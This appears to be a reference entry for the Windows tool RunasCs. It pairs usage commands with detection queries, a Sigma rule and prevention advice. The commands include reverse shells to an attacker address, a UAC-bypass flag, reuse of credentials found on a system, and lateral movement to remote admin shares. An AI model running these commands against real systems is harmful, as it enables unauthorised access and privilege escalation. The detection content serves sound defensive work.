name: RunasCs - Windows Runas Alternative with Full Credential Support
description: RunasCs is a runas alternative that supports plaintext credentials, NTLM hashes, Kerberos tickets, and various logon types. Unlike built-in runas, it works via non-interactive sessions (reverse shells, webshells), supports network logon (type 9), and can create processes with different credential combinations.
notes:
=== BASIC USAGE ===
  RunasCs.exe <user> <password> cmd.exe
  RunasCs.exe administrator P@ssword123 "cmd.exe /c whoami"

=== REVERSE SHELL ===
  RunasCs.exe user pass cmd.exe -r <attacker_ip>:<port>
  # Runs cmd.exe as 'user' and sends output to attacker

=== LOGON TYPES ===
  RunasCs.exe user pass cmd.exe -l 2    # Interactive logon (default)
  RunasCs.exe user pass cmd.exe -l 9    # NewCredentials (like runas /netonly)
  RunasCs.exe user pass cmd.exe -l 3    # Network logon
  # Type 9 is most useful: local commands run as current user,
  # network commands (SMB, LDAP, etc.) use the new credentials

=== BYPASS UAC ===
  RunasCs.exe admin pass cmd.exe --bypass-uac
  # Starts elevated process without UAC prompt

=== CREATE PROCESS ===
  RunasCs.exe user pass powershell.exe -t 0
  # -t 0 = create process in session 0 (service context)

=== WHY NOT JUST RUNAS? ===
- runas requires an interactive console (fails in shells)
- runas can't do network-only logon (type 9) easily
- runas can't bypass UAC
- RunasCs works from webshells, reverse shells, WinRM, etc.

=== CHAIN ===
  # Found creds in config file? Spawn shell as that user:
  RunasCs.exe svc_account DbP@ss123 cmd.exe -r 10.10.14.5:9001
  # Or use for lateral movement:
  RunasCs.exe admin Pass123 "cmd.exe /c dir \\target\C$" -l 9

defense.why_it_works: RunasCs uses Windows APIs (CreateProcessWithLogonW, LogonUser) to create processes with alternate credentials, supporting logon types that the built-in runas command doesn't expose.
defense.prerequisites: Valid credentials for the target user; RunasCs binary on the target.
defense.impact: Privilege escalation or lateral movement using discovered credentials.
defense.detection: [MITRE T1134.002] Unusual process creation with LogonType 9; RunasCs.exe in process logs; credential use from unexpected sources.
defense.artifacts: Event 4624 (logon) with specific logon types; process creation logs; RunasCs binary on disk.
defense.splunk_spl:
index=wineventlog EventCode=4688 NewProcessName="*RunasCs*"
| table _time, SubjectUserName, NewProcessName, CommandLine, TargetUserName
defense.sentinel_kql:
SecurityEvent
| where EventID == 4688 and (NewProcessName contains "RunasCs" or CommandLine contains "RunasCs")
| project TimeGenerated, SubjectUserName, NewProcessName, CommandLine
defense.prevention: Block unauthorized binaries via AppLocker/WDAC; monitor for unusual logon types; restrict credential storage.

detections.name: RunasCs execution detection
detections.logic:
title: RunasCs Execution
status: experimental
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith: '\RunasCs.exe'
  selection2:
    CommandLine|contains: 'RunasCs'
  condition: selection or selection2
level: high
detections.false_positives: Legitimate admin use of RunasCs for service management
detections.tuning: Correlate with logon events (4624) and parent process
